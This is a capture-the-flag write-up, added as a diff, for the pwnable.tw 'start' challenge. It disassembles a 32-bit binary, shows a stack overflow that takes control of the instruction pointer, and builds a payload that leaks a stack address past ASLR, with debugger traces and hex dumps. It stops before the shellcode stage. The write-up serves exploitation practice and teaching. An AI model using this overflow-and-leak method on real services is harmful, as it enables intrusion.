@@ -1,0 +1,232 @@
+Location: nc chall.pwnable.tw 10000
+Using pwndbg to debug
+=========== what we know ================
+$ file start 
+start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
+
+$ nc chall.pwnable.tw 10000
+Let's start the CTF:stuff
+
+This challenge has ASLR enabled, it's worth noting that gdb disables ASLR
+
+========== disassemble that bin ============
+$ objdump -d start 
+
+start:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	54                   	push   %esp
+ 8048061:	68 9d 80 04 08       	push   $0x804809d
+ 8048066:	31 c0                	xor    %eax,%eax    
+ 8048068:	31 db                	xor    %ebx,%ebx
+ 804806a:	31 c9                	xor    %ecx,%ecx
+ 804806c:	31 d2                	xor    %edx,%edx
+ 804806e:	68 43 54 46 3a       	push   $0x3a465443  #push text
+ 8048073:	68 74 68 65 20       	push   $0x20656874  #push text
+ 8048078:	68 61 72 74 20       	push   $0x20747261  #push text
+ 804807d:	68 73 20 73 74       	push   $0x74732073  #push text
+ 8048082:	68 4c 65 74 27       	push   $0x2774654c  #push text, now can set up syscall to write
+ 8048087:	89 e1                	mov    %esp,%ecx    #ecx passes pointer to what needs to be written
+ 8048089:	b2 14                	mov    $0x14,%dl    #dl passes message length (dec 20)
+ 804808b:	b3 01                	mov    $0x1,%bl     #file descriptor: stdout
+ 804808d:	b0 04                	mov    $0x4,%al     #system call number (sys_write)
+ 804808f:	cd 80                	int    $0x80        #perform syscall
+ 8048091:	31 db                	xor    %ebx,%ebx    #file descriptor: stdin
+ 8048093:	b2 3c                	mov    $0x3c,%dl    #number of bytes read (dec 60)
+ 8048095:	b0 03                	mov    $0x3,%al     #system call number (sys_read)
+ 8048097:	cd 80                	int    $0x80        #perform syscall
+ 8048099:	83 c4 14             	add    $0x14,%esp   #change esp to after the previously pushed text
+ 804809c:	c3                   	ret    
+
+0804809d <_exit>:
+ 804809d:	5c                   	pop    %esp
+ 804809e:	31 c0                	xor    %eax,%eax
+ 80480a0:	40                   	inc    %eax
+ 80480a1:	cd 80                	int    $0x80
+ 
+  
+================ Overflow ======================
+Let's server the bin locally with socat:
+$ socat tcp-l:7777,reuseaddr,fork system:'location/start',nofork
+
+Now call like so, using the file "base" as payload: (24 As)
+$ cat base 
+AAAAAAAAAAAAAAAAAAAAAAAA
+$ socat tcp:localhost:7777 - < base
+Let's start the CTF:$
+
+Server side:
+Segmentation fault
+
+Change last 4 bytes of payload to Bs, then in gdb:
+$ gdb ./start 
+pwndbg> r < base
+Starting program: location/start < base
+Let's start the CTF:
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+================ What's moving around? ================
+Given that we have ASLR enabled, let's find out what chunks of memory are getting their address space randomized.
+I'm going to do this by running calling it client side and doing $ cat /proc/PID/maps
+
+First run:
+$ cat /proc/27459/maps
+08048000-08049000 r-xp 00000000 fc:01 131414                             /location/start
+f7769000-f776b000 r--p 00000000 00:00 0                                  [vvar]
+f776b000-f776c000 r-xp 00000000 00:00 0                                  [vdso]
+ffe11000-ffe32000 rwxp 00000000 00:00 0                                  [stack]
+
+Second:
+$ cat /proc/27495/maps
+08048000-08049000 r-xp 00000000 fc:01 131414                             /location/start
+f778a000-f778c000 r--p 00000000 00:00 0                                  [vvar]
+f778c000-f778d000 r-xp 00000000 00:00 0                                  [vdso]
+ff881000-ff8a2000 rwxp 00000000 00:00 0                                  [stack]
+
+Third:
+$ cat /proc/27504/maps
+08048000-08049000 r-xp 00000000 fc:01 131414                             /location/start
+f77e3000-f77e5000 r--p 00000000 00:00 0                                  [vvar]
+f77e5000-f77e6000 r-xp 00000000 00:00 0                                  [vdso]
+ffbf7000-ffc18000 rwxp 00000000 00:00 0                                  [stack]
+
+So as we can see, only the /location/start file is not moving. Let's see if we can leverage that.
+
+============== Turning a frame into a lever ======================
+Let's take a closer look at the objdump
+
+ 8048087:	89 e1                	mov    %esp,%ecx    #ecx passes pointer to what needs to be written
+ 8048089:	b2 14                	mov    $0x14,%dl    #dl passes message length (dec 20)
+ 804808b:	b3 01                	mov    $0x1,%bl     #file descriptor: stdout
+ 804808d:	b0 04                	mov    $0x4,%al     #system call number (sys_write)
+ 804808f:	cd 80                	int    $0x80        #perform syscall
+ 8048091:	31 db                	xor    %ebx,%ebx    #file descriptor: stdin
+ 8048093:	b2 3c                	mov    $0x3c,%dl    #number of bytes read (dec 60)
+ 8048095:	b0 03                	mov    $0x3,%al     #system call number (sys_read)
+ 8048097:	cd 80                	int    $0x80        #perform syscall
+ 8048099:	83 c4 14             	add    $0x14,%esp   #change esp to after the previously pushed text
+ 804809c:	c3                   	ret    
+
+ Notice how first the "Let's start the CTF" text is pushed onto the stack
+ Then sys_write using the value in ecx
+ Then sys_read from stdin (which we control)
+ Then pop "Let's start the CTF" off the stack
+ Finally, ret to whatever value is in eip
+ 
+ What if we overwrite eip (which we control) to the address of the instruction just before the parameters are loaded into the registers for the call to sys_write?
+ In that scenario, esp will not be pointing to the stack value for "Let's start the CTF" but rather the values of pushed onto the stack prior to that.
+ This means that, as per the push %esp instruction at 0x8048060, we should be able to send the value of esp to sys_write to then written to stdout
+ 
+ Hey! that's not a bad idea ;) Let's see where this goes
+ 
+ ============= Trying it out ========================================
+ First I gotta change the payload to have the address of "mov    %esp,%ecx " instead of BBBB:
+ $ xxd leak
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 8780 0408 0a                   AAAA.....
+
+Now we break right after the instruction we're interested in to see what the stack and registers look like:
+0x08048089 in _start ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[-------------------------------------------------------REGISTERS--------------------------------------------------------]
+ EAX  0x0
+ EBX  0x0
+*ECX  0xffffd094 <-- 0x2774654c ("Let'")
+ EDX  0x0
+ EDI  0x0
+ ESI  0x0
+ EBP  0x0
+ ESP  0xffffd094 <-- 0x2774654c ("Let'")
+*EIP  0x8048089 (_start+41) <-- mov    dl, 0x14
+[----------------------------------------------------------CODE----------------------------------------------------------]
+    0x8048073 <_start+19>    push   0x20656874
+    0x8048078 <_start+24>    push   0x20747261
+    0x804807d <_start+29>    push   0x74732073
+    0x8048082 <_start+34>    push   0x2774654c
+    0x8048087 <_start+39>    mov    ecx, esp
+ => 0x8048089 <_start+41>    mov    dl, 0x14
+    0x804808b <_start+43>    mov    bl, 1
+    0x804808d <_start+45>    mov    al, 4
+    0x804808f <_start+47>    int    0x80
+    0x8048091 <_start+49>    xor    ebx, ebx
+    0x8048093 <_start+51>    mov    dl, 0x3c
+[---------------------------------------------------------STACK----------------------------------------------------------]
+00:0000| ecx esp  0xffffd094 <-- 0x2774654c ("Let'")
+01:0004|          0xffffd098 <-- 0x74732073 ('s st')
+02:0008|          0xffffd09c <-- 0x20747261 ('art ')
+03:000c|          0xffffd0a0 <-- 0x20656874 ('the ')
+04:0010|          0xffffd0a4 <-- 0x3a465443 ('CTF:')
+05:0014|          0xffffd0a8 --> 0x804809d (_exit) <-- pop    esp /* '\\1@' */
+06:0018|          0xffffd0ac --> 0xffffd0b0 <-- 0x1
+07:001c|          0xffffd0b0 <-- 0x1
+[-------------------------------------------------------BACKTRACE--------------------------------------------------------]
+>  f 0  8048089 _start+41
+
+As predicted, it's pointing to the string to be written to stdout
+Now we let her rip until it hits the instruction again (since we control eip) 
+ 
+pwndbg> c
+Continuing.
+Let's start the CTF:
+Breakpoint 2, 0x08048089 in _start ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[-------------------------------------------------------REGISTERS--------------------------------------------------------]
+*EAX  0x19
+ EBX  0x0
+*ECX  0xffffd0ac --> 0xffffd00a <-- 0x0
+*EDX  0x3c
+ EDI  0x0
+ ESI  0x0
+ EBP  0x0
+*ESP  0xffffd0ac --> 0xffffd00a <-- 0x0
+ EIP  0x8048089 (_start+41) <-- mov    dl, 0x14
+[----------------------------------------------------------CODE----------------------------------------------------------]
+    0x8048073 <_start+19>    push   0x20656874
+    0x8048078 <_start+24>    push   0x20747261
+    0x804807d <_start+29>    push   0x74732073
+    0x8048082 <_start+34>    push   0x2774654c
+    0x8048087 <_start+39>    mov    ecx, esp
+ => 0x8048089 <_start+41>    mov    dl, 0x14
+    0x804808b <_start+43>    mov    bl, 1
+    0x804808d <_start+45>    mov    al, 4
+    0x804808f <_start+47>    int    0x80
+    0x8048091 <_start+49>    xor    ebx, ebx
+    0x8048093 <_start+51>    mov    dl, 0x3c
+[---------------------------------------------------------STACK----------------------------------------------------------]
+00:0000| ecx esp  0xffffd0ac --> 0xffffd00a <-- 0x0
+01:0004|          0xffffd0b0 <-- 0x1
+02:0008|          0xffffd0b4 --> 0xffffd28b <-- '/location/start...'
+03:000c|          0xffffd0b8 <-- 0x0
+04:0010|          0xffffd0bc --> 0xffffd2b4 <-- 'XDG_VTNR=7'
+05:0014|          0xffffd0c0 --> 0xffffd2bf <-- 'XDG_SESSION_ID=...'
+06:0018|          0xffffd0c4 --> 0xffffd2d1 <-- 'XDG_GREETER_DAT...'
+07:001c|          0xffffd0c8 --> 0xffffd303 <-- 'CLUTTER_IM_MODU...'
+[-------------------------------------------------------BACKTRACE--------------------------------------------------------]
+>  f 0  8048089 _start+41
+Breakpoint *0x8048089
+
+As expected, "Let's start the CTF:" has been written to stdout before the breakpoint was hit
+More notably, the stack is completely different. Let's let it run and see what comes out.
+
+pwndbg> c
+Continuing.
+
+�����������
+Program received signal SIGSEGV, Segmentation fault.
+
+So we got 2 calls to sys_write, the second one leaks a 5 words from the stack (as per the instruction at 0x8048089)
+Pipe stdout to xxd gives us a clearer picture:
+
+pwndbg> r < leak | xxd
+Starting program: /loaction/start < leak | xxd
+00000000: 4c65 7427 7320 7374 6172 7420 7468 6520  Let's start the 
+00000010: 4354 463a 0ad0 ffff 0100 0000 8bd2 ffff  CTF:............
+00000020: 0000 0000 b4d2 ffff                      ........
+During startup program exited normally.
+
+Now, 0xffffd0ac - 0xffffd00a = 162 thus if we use the first word out of stdout and add 162 to it we have a pointer to the stack.
+We just found relative offset to a randomized address. We should be able to leverage this to run some shellcode
